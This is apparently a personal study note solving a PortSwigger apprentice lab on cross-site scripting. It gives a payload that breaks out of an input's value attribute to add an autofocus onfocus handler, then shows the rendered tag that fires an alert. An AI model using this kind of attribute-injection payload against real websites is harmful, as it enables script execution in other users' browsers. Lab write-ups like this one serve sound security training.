#portswigger #solution #xss

- **Category:** [[Cross-site scriping (XSS)]]
- **Difficulty:** [[Apprentice]]
- **URL Lab:** https://portswigger.net/web-security/cross-site-scripting
- **Date Solved:** 2026-08-19

This LAB's idea is to manipulate the `<input>`'s attribute, I used this payload:
```
" autofocus onfocus=alert(document.domain) x="
```

And suddenly, after rendering, the `<input>` now becomes:
```
<input type="text" name="search" value="" autofocus onfocus=alert(document.domain) x="">
```
And the alert is automatically triggered.

![[Pasted image 20260819155628.png]]